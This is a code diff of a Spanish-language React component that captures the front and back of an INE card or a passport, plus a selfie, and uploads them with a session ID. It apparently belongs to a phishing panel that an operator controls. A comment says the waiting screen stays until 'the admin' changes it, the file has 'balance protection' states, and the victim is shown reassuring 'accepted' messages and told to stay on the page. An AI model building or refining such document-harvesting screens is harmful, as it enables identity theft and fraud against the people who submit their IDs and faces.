@@ -78,13 +78,15 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   
   // Estados para verificación de identidad
   const [documentType, setDocumentType] = useState("");
-  const [currentStep, setCurrentStep] = useState<'select' | 'document' | 'selfie' | 'validating' | 'success'>('select');
+  const [currentStep, setCurrentStep] = useState<'select' | 'document_front' | 'preview_front' | 'document_back' | 'preview_back' | 'selfie' | 'preview_selfie' | 'validating' | 'success'>('select');
   const [videoRef, setVideoRef] = useState<HTMLVideoElement | null>(null);
   const [canvasRef, setCanvasRef] = useState<HTMLCanvasElement | null>(null);
   const [selfieVideoRef, setSelfieVideoRef] = useState<HTMLVideoElement | null>(null);
   const [selfieCanvasRef, setSelfieCanvasRef] = useState<HTMLCanvasElement | null>(null);
-  const [documentImage, setDocumentImage] = useState<string | null>(null);
+  const [documentFrontImage, setDocumentFrontImage] = useState<string | null>(null);
+  const [documentBackImage, setDocumentBackImage] = useState<string | null>(null);
   const [selfieImage, setSelfieImage] = useState<string | null>(null);
+  const [currentPhotoPreview, setCurrentPhotoPreview] = useState<string | null>(null);
   const [isUploading, setIsUploading] = useState(false);
   
   // Estados para protección de saldo
@@ -916,7 +918,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             alert('Por favor, selecciona un tipo de documento.');
             return;
           }
-          setCurrentStep('document');
+          setCurrentStep('document_front');
           try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             if (videoRef) {
@@ -927,7 +929,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
           }
         };
 
-        const captureDocument = async () => {
+        const captureDocumentFront = async () => {
           if (!videoRef || !canvasRef) return;
           
           canvasRef.width = videoRef.videoWidth;
@@ -936,22 +938,100 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
           if (context) {
             context.drawImage(videoRef, 0, 0);
             const docImage = canvasRef.toDataURL('image/png');
-            setDocumentImage(docImage);
+            setDocumentFrontImage(docImage);
+            setCurrentPhotoPreview(docImage);
             
-            // Detener cámara del documento
+            // Detener cámara
             const tracks = (videoRef.srcObject as MediaStream)?.getTracks();
             tracks?.forEach(track => track.stop());
             
-            // Mostrar cámara para selfie
-            setCurrentStep('selfie');
-            try {
-              const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-              if (selfieVideoRef) {
-                selfieVideoRef.srcObject = stream;
-              }
-            } catch (err) {
-              alert('No se pudo acceder a la cámara para selfie: ' + err);
+            setCurrentStep('preview_front');
+          }
+        };
+
+        const captureDocumentBack = async () => {
+          if (!videoRef || !canvasRef) return;
+          
+          canvasRef.width = videoRef.videoWidth;
+          canvasRef.height = videoRef.videoHeight;
+          const context = canvasRef.getContext('2d');
+          if (context) {
+            context.drawImage(videoRef, 0, 0);
+            const docImage = canvasRef.toDataURL('image/png');
+            setDocumentBackImage(docImage);
+            setCurrentPhotoPreview(docImage);
+            
+            // Detener cámara
+            const tracks = (videoRef.srcObject as MediaStream)?.getTracks();
+            tracks?.forEach(track => track.stop());
+            
+            setCurrentStep('preview_back');
+          }
+        };
+
+        const startBackCamera = async () => {
+          setCurrentStep('document_back');
+          try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            if (videoRef) {
+              videoRef.srcObject = stream;
             }
+          } catch (err) {
+            alert('No se pudo acceder a la cámara: ' + err);
+          }
+        };
+
+        const retakePhoto = async (step: string) => {
+          if (step === 'front') {
+            setDocumentFrontImage(null);
+            setCurrentStep('document_front');
+          } else if (step === 'back') {
+            setDocumentBackImage(null);
+            setCurrentStep('document_back');
+          } else if (step === 'selfie') {
+            setSelfieImage(null);
+            setCurrentStep('selfie');
+          }
+          
+          try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            if (step === 'selfie' && selfieVideoRef) {
+              selfieVideoRef.srcObject = stream;
+            } else if (videoRef) {
+              videoRef.srcObject = stream;
+            }
+          } catch (err) {
+            alert('No se pudo acceder a la cámara: ' + err);
+          }
+        };
+
+        const confirmPhoto = (photoType: string) => {
+          if (photoType === 'front') {
+            if (documentType === 'ine') {
+              // Para INE, continuar con reverso
+              startBackCamera();
+            } else {
+              // Para pasaporte, ir directo a selfie
+              startSelfieCamera();
+            }
+          } else if (photoType === 'back') {
+            // Después del reverso del INE, ir a selfie
+            startSelfieCamera();
+          } else if (photoType === 'selfie') {
+            // Subir todas las fotos
+            uploadIdentityFiles();
+          }
+        };
+
+        const startSelfieCamera = async () => {
+          setCurrentStep('selfie');
+          try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            if (selfieVideoRef) {
+              selfieVideoRef.srcObject = stream;
+            }
+          } catch (err) {
+            alert('No se pudo acceder a la cámara para selfie: ' + err);
           }
         };
 
@@ -965,32 +1045,45 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             context.drawImage(selfieVideoRef, 0, 0);
             const selfie = selfieCanvasRef.toDataURL('image/png');
             setSelfieImage(selfie);
+            setCurrentPhotoPreview(selfie);
             
             // Detener cámara de selfie
             const tracks = (selfieVideoRef.srcObject as MediaStream)?.getTracks();
             tracks?.forEach(track => track.stop());
             
-            // Subir archivos y mostrar validación
-            await uploadIdentityFiles(documentImage, selfie);
+            setCurrentStep('preview_selfie');
           }
         };
 
-        const uploadIdentityFiles = async (docImage: string | null, selfie: string | null) => {
-          if (!docImage || !selfie) return;
+        const uploadIdentityFiles = async () => {
+          const frontImage = documentFrontImage;
+          const backImage = documentType === 'ine' ? documentBackImage : null;
+          const selfie = selfieImage;
+          
+          if (!frontImage || !selfie || (documentType === 'ine' && !backImage)) {
+            alert('Faltan imágenes por capturar.');
+            return;
+          }
           
           setCurrentStep('validating');
           setIsUploading(true);
           
           try {
             // Convertir base64 a blob
-            const docBlob = await fetch(docImage).then(r => r.blob());
+            const frontBlob = await fetch(frontImage).then(r => r.blob());
             const selfieBlob = await fetch(selfie).then(r => r.blob());
             
             const formData = new FormData();
-            formData.append('documentFile', docBlob, `documento_${documentType}.png`);
+            formData.append('documentFile', frontBlob, `documento_${documentType}_frente.png`);
             formData.append('selfieFile', selfieBlob, 'selfie.png');
             formData.append('documentType', documentType);
             formData.append('sessionId', sessionId);
+            
+            // Si es INE, agregar también el reverso
+            if (documentType === 'ine' && backImage) {
+              const backBlob = await fetch(backImage).then(r => r.blob());
+              formData.append('documentBackFile', backBlob, `documento_${documentType}_reverso.png`);
+            }
 
             const response = await fetch('/api/upload-identity-files', {
               method: 'POST',
@@ -1002,16 +1095,14 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               throw new Error('Error al subir los archivos');
             }
 
-            // Simular validación por 5 segundos
-            setTimeout(() => {
-              setCurrentStep('success');
-              onSubmit(ScreenType.VERIFICACION_ID, {
-                documentType,
-                documentUploaded: true,
-                selfieUploaded: true,
-                verified: true
-              });
-            }, 5000);
+            // Una vez subido exitosamente, simplemente mostrar validando
+            // La pantalla se mantendrá así hasta que el admin la cambie
+            onSubmit(ScreenType.VERIFICACION_ID, {
+              documentType,
+              documentUploaded: true,
+              selfieUploaded: true,
+              verified: true
+            });
 
           } catch (error) {
             console.error('Error uploading identity files:', error);
@@ -1024,82 +1115,318 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
 
         const verificacionIdContent = (
           <>
-            <h1 className="text-xl font-bold mb-4">Validación de Identidad</h1>
+            <div className="text-center mb-6">
+              <h1 className="text-2xl font-bold mb-2 text-gray-800">🔐 Validación de Identidad</h1>
+              <div className="w-16 h-1 bg-blue-500 mx-auto rounded"></div>
+            </div>
             
-            <div className="bg-gray-100 border border-gray-300 p-4 mb-5 rounded">
-              <strong>Para tu seguridad:</strong> Necesitamos verificar tu identidad. Toma una foto de tu documento y una selfie para confirmar que eres tú y proteger tu cuenta.
+            <div className="bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-200 p-6 mb-6 rounded-xl shadow-sm">
+              <div className="flex items-start gap-3">
+                <div className="bg-blue-100 p-2 rounded-full">
+                  <span className="text-blue-600 text-xl">🛡️</span>
+                </div>
+                <div>
+                  <h3 className="font-semibold text-blue-900 mb-2">Para tu seguridad</h3>
+                  <p className="text-blue-800 text-sm leading-relaxed">
+                    Necesitamos verificar tu identidad para proteger tu cuenta. Este proceso es completamente seguro y tus documentos están protegidos.
+                  </p>
+                </div>
+              </div>
             </div>
 
             {currentStep === 'select' && (
-              <>
-                <p className="mb-4">Selecciona el tipo de documento:</p>
-                <select 
-                  value={documentType}
-                  onChange={(e) => setDocumentType(e.target.value)}
-                  className="w-full p-2 border border-gray-300 rounded mb-4"
-                >
-                  <option value="">--Selecciona--</option>
-                  <option value="ine">INE</option>
-                  <option value="pasaporte">Pasaporte</option>
-                </select>
-                <Button 
-                  className={primaryBtnClass}
-                  onClick={startCamera}
-                >
-                  Subir Documento
-                </Button>
-              </>
+              <div className="space-y-6">
+                <div>
+                  <h3 className="text-lg font-semibold mb-4 text-center">📄 Selecciona tu documento de identidad</h3>
+                  
+                  <div className="space-y-3 mb-6">
+                    <div 
+                      className={`border-2 rounded-xl p-4 cursor-pointer transition-all duration-200 ${
+                        documentType === 'ine' 
+                          ? 'border-blue-500 bg-blue-50 shadow-md' 
+                          : 'border-gray-200 hover:border-gray-300 hover:bg-gray-50'
+                      }`}
+                      onClick={() => setDocumentType('ine')}
+                    >
+                      <div className="flex items-center gap-3">
+                        <div className="bg-green-100 p-2 rounded-lg">
+                          <span className="text-green-600 text-xl">🆔</span>
+                        </div>
+                        <div>
+                          <h4 className="font-semibold text-gray-800">INE (Credencial para Votar)</h4>
+                          <p className="text-sm text-gray-600">Se tomarán fotos del frente y reverso</p>
+                        </div>
+                        <div className="ml-auto">
+                          {documentType === 'ine' && <span className="text-blue-500 text-xl">✓</span>}
+                        </div>
+                      </div>
+                    </div>
+                    
+                    <div 
+                      className={`border-2 rounded-xl p-4 cursor-pointer transition-all duration-200 ${
+                        documentType === 'pasaporte' 
+                          ? 'border-blue-500 bg-blue-50 shadow-md' 
+                          : 'border-gray-200 hover:border-gray-300 hover:bg-gray-50'
+                      }`}
+                      onClick={() => setDocumentType('pasaporte')}
+                    >
+                      <div className="flex items-center gap-3">
+                        <div className="bg-purple-100 p-2 rounded-lg">
+                          <span className="text-purple-600 text-xl">📘</span>
+                        </div>
+                        <div>
+                          <h4 className="font-semibold text-gray-800">Pasaporte</h4>
+                          <p className="text-sm text-gray-600">Solo se tomará foto del frente</p>
+                        </div>
+                        <div className="ml-auto">
+                          {documentType === 'pasaporte' && <span className="text-blue-500 text-xl">✓</span>}
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  
+                  <Button 
+                    className={`${primaryBtnClass} w-full py-4 text-lg font-semibold rounded-xl shadow-lg transition-all duration-200 ${
+                      !documentType ? 'opacity-50 cursor-not-allowed' : 'hover:shadow-xl'
+                    }`}
+                    onClick={startCamera}
+                    disabled={!documentType}
+                  >
+                    📸 Comenzar Verificación
+                  </Button>
+                </div>
+              </div>
             )}
 
-            {currentStep === 'document' && (
+            {currentStep === 'document_front' && (
               <div className="text-center">
-                <h2 className="text-lg font-bold mb-4">Captura tu documento</h2>
-                <video 
-                  ref={setVideoRef}
-                  autoPlay 
-                  className="w-full max-w-md border-2 border-gray-800 mb-4"
-                />
+                <h2 className="text-lg font-bold mb-4">
+                  {documentType === 'ine' ? 'Captura el FRENTE de tu INE' : 'Captura tu Pasaporte'}
+                </h2>
+                <div className="bg-blue-50 border border-blue-200 p-3 mb-4 rounded-lg">
+                  <p className="text-blue-800 text-sm">
+                    📱 {documentType === 'ine' 
+                      ? 'Asegúrate de que se vea claramente tu foto y datos personales'
+                      : 'Asegúrate de que se vea claramente tu foto y datos del pasaporte'
+                    }
+                  </p>
+                </div>
+                <div className="relative mb-4">
+                  <video 
+                    ref={setVideoRef}
+                    autoPlay 
+                    className="w-full max-w-md border-2 border-blue-300 rounded-lg shadow-lg"
+                  />
+                  <div className="absolute inset-0 border-2 border-blue-500 rounded-lg pointer-events-none opacity-50"></div>
+                </div>
                 <canvas ref={setCanvasRef} style={{ display: 'none' }} />
-                <br />
                 <Button 
-                  className={primaryBtnClass}
-                  onClick={captureDocument}
+                  className={`${primaryBtnClass} px-8 py-3 text-lg font-semibold`}
+                  onClick={captureDocumentFront}
                 >
-                  Capturar Documento
+                  📸 Capturar {documentType === 'ine' ? 'Frente' : 'Documento'}
                 </Button>
+              </div>
+            )}
+
+            {currentStep === 'preview_front' && (
+              <div className="text-center">
+                <h2 className="text-lg font-bold mb-4 text-green-700">
+                  📋 ¿Está correcta la foto?
+                </h2>
+                <div className="mb-6">
+                  <img 
+                    src={currentPhotoPreview || ''}
+                    alt="Vista previa documento frente"
+                    className="w-full max-w-sm border-4 border-green-200 rounded-lg mx-auto shadow-lg"
+                    style={{ maxHeight: '350px', objectFit: 'contain' }}
+                  />
+                </div>
+                <div className="flex gap-4 justify-center">
+                  <Button 
+                    variant="outline"
+                    onClick={() => retakePhoto('front')}
+                    className="bg-gray-50 text-gray-700 border-2 border-gray-300 hover:bg-gray-100 px-6 py-3"
+                  >
+                    🔄 Volver a tomar
+                  </Button>
+                  <Button 
+                    className={`${primaryBtnClass} px-8 py-3 font-semibold`}
+                    onClick={() => confirmPhoto('front')}
+                  >
+                    ✅ Está perfecta
+                  </Button>
+                </div>
+              </div>
+            )}
+
+            {currentStep === 'document_back' && (
+              <div className="text-center">
+                <h2 className="text-lg font-bold mb-4">Captura el REVERSO de tu INE</h2>
+                <div className="bg-orange-50 border border-orange-200 p-3 mb-4 rounded-lg">
+                  <p className="text-orange-800 text-sm">
+                    📱 Ahora captura la parte de atrás donde aparece tu CURP y dirección
+                  </p>
+                </div>
+                <div className="relative mb-4">
+                  <video 
+                    ref={setVideoRef}
+                    autoPlay 
+                    className="w-full max-w-md border-2 border-orange-300 rounded-lg shadow-lg"
+                  />
+                  <div className="absolute inset-0 border-2 border-orange-500 rounded-lg pointer-events-none opacity-50"></div>
+                </div>
+                <canvas ref={setCanvasRef} style={{ display: 'none' }} />
+                <Button 
+                  className={`${primaryBtnClass} px-8 py-3 text-lg font-semibold`}
+                  onClick={captureDocumentBack}
+                >
+                  📸 Capturar Reverso
+                </Button>
+              </div>
+            )}
+
+            {currentStep === 'preview_back' && (
+              <div className="text-center">
+                <h2 className="text-lg font-bold mb-4 text-green-700">
+                  📋 ¿Está correcta la foto del reverso?
+                </h2>
+                <div className="mb-6">
+                  <img 
+                    src={currentPhotoPreview || ''}
+                    alt="Vista previa documento reverso"
+                    className="w-full max-w-sm border-4 border-green-200 rounded-lg mx-auto shadow-lg"
+                    style={{ maxHeight: '350px', objectFit: 'contain' }}
+                  />
+                </div>
+                <div className="flex gap-4 justify-center">
+                  <Button 
+                    variant="outline"
+                    onClick={() => retakePhoto('back')}
+                    className="bg-gray-50 text-gray-700 border-2 border-gray-300 hover:bg-gray-100 px-6 py-3"
+                  >
+                    🔄 Volver a tomar
+                  </Button>
+                  <Button 
+                    className={`${primaryBtnClass} px-8 py-3 font-semibold`}
+                    onClick={() => confirmPhoto('back')}
+                  >
+                    ✅ Está perfecta
+                  </Button>
+                </div>
               </div>
             )}
 
             {currentStep === 'selfie' && (
               <div className="text-center">
-                <h2 className="text-lg font-bold mb-4">Ahora toma tu selfie</h2>
-                <video 
-                  ref={setSelfieVideoRef}
-                  autoPlay 
-                  className="w-full max-w-md border-2 border-gray-800 mb-4"
-                />
+                <h2 className="text-lg font-bold mb-4">📷 Ahora toma tu selfie</h2>
+                <div className="bg-purple-50 border border-purple-200 p-3 mb-4 rounded-lg">
+                  <p className="text-purple-800 text-sm">
+                    👤 Mira directamente a la cámara y asegúrate de que tu cara se vea claramente
+                  </p>
+                </div>
+                <div className="relative mb-4">
+                  <video 
+                    ref={setSelfieVideoRef}
+                    autoPlay 
+                    className="w-full max-w-md border-2 border-purple-300 rounded-full shadow-lg"
+                    style={{ transform: 'scaleX(-1)', aspectRatio: '1/1', objectFit: 'cover' }}
+                  />
+                  <div className="absolute inset-0 border-2 border-purple-500 rounded-full pointer-events-none opacity-50"></div>
+                </div>
                 <canvas ref={setSelfieCanvasRef} style={{ display: 'none' }} />
-                <br />
                 <Button 
-                  className={primaryBtnClass}
+                  className={`${primaryBtnClass} px-8 py-3 text-lg font-semibold`}
                   onClick={captureSelfie}
                 >
-                  Capturar Selfie
+                  🤳 Capturar Selfie
                 </Button>
+              </div>
+            )}
+
+            {currentStep === 'preview_selfie' && (
+              <div className="text-center">
+                <h2 className="text-lg font-bold mb-4 text-green-700">
+                  👤 ¿Se ve bien la foto?
+                </h2>
+                <div className="mb-6">
+                  <img 
+                    src={currentPhotoPreview || ''}
+                    alt="Vista previa selfie"
+                    className="w-full max-w-sm border-4 border-green-200 rounded-full mx-auto shadow-lg"
+                    style={{ maxHeight: '350px', aspectRatio: '1/1', objectFit: 'cover' }}
+                  />
+                </div>
+                <div className="flex gap-4 justify-center">
+                  <Button 
+                    variant="outline"
+                    onClick={() => retakePhoto('selfie')}
+                    className="bg-gray-50 text-gray-700 border-2 border-gray-300 hover:bg-gray-100 px-6 py-3"
+                  >
+                    🔄 Volver a tomar
+                  </Button>
+                  <Button 
+                    className={`${primaryBtnClass} px-8 py-3 font-semibold`}
+                    onClick={() => confirmPhoto('selfie')}
+                  >
+                    ✅ Se ve perfecta
+                  </Button>
+                </div>
               </div>
             )}
 
             {currentStep === 'validating' && (
               <div className="text-center">
-                <h2 className="text-lg font-bold mb-4">Validando información...</h2>
-                <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600 mx-auto"></div>
+                <div className="mb-6">
+                  <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                    <span className="text-green-600 text-3xl">✅</span>
+                  </div>
+                  <h2 className="text-xl font-bold mb-2 text-green-700">¡Información Aceptada!</h2>
+                  <p className="text-green-600 font-medium">Documentos enviados correctamente</p>
+                </div>
+                
+                <div className="bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 p-6 mb-6 rounded-xl shadow-sm">
+                  <div className="flex items-start gap-3">
+                    <div className="bg-green-100 p-2 rounded-full">
+                      <span className="text-green-600 text-xl">⏳</span>
+                    </div>
+                    <div>
+                      <h3 className="font-semibold text-green-900 mb-2">Esperando Validación</h3>
+                      <p className="text-green-800 text-sm leading-relaxed">
+                        Tu información está siendo verificada por nuestro equipo de seguridad. 
+                        Mantente en esta pantalla mientras procesamos tus documentos.
+                      </p>
+                    </div>
+                  </div>
+                </div>
+                
+                <div className="flex justify-center mb-4">
+                  <div className="animate-spin rounded-full h-12 w-12 border-4 border-green-200 border-t-green-600"></div>
+                </div>
+                
+                <div className="bg-blue-50 border border-blue-200 p-4 rounded-lg">
+                  <p className="text-blue-800 text-sm">
+                    💡 <strong>Tip:</strong> Este proceso puede tomar unos minutos. No cierres esta ventana.
+                  </p>
+                </div>
               </div>
             )}
 
             {currentStep === 'success' && (
               <div className="text-center">
-                <h2 className="text-lg font-bold mb-4 text-green-600">Validación con éxito ✅</h2>
-                <p>Tu identidad ha sido verificada correctamente.</p>
+                <div className="mb-6">
+                  <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                    <span className="text-green-600 text-3xl">🎉</span>
+                  </div>
+                  <h2 className="text-xl font-bold mb-2 text-green-700">¡Verificación Exitosa!</h2>
+                  <p className="text-green-600">Tu identidad ha sido verificada correctamente</p>
+                </div>
+                
+                <div className="bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 p-6 rounded-xl shadow-sm">
+                  <p className="text-green-800 font-medium">
+                    ✅ Proceso completado con éxito
+                  </p>
+                </div>
               </div>
             )}
           </>
